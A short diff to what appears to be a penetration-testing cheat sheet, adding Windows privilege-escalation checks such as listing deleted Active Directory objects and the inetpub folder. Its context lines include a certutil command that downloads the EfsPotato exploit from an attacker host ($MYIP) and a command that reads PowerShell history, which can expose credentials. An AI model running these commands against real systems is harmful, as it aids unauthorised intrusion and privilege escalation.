@@ -986,9 +986,12 @@ certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPo
 
 [*] Privilege Escalation
 +---------- Initial Checks ----------+
+powershell -c "Import-Module ActiveDirectory"
+powershell -c "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects"
 powershell -c "type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 powershell -c "whoami /user /priv"
 powershell -c "cd \users; tree /a /f"
+powershell -c "cd \inetpub; tree /a /f"
 powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
 powershell -c "if ([Environment]::Is64BitOperatingSystem) { '64-bit' } else { '32-bit' }"
 
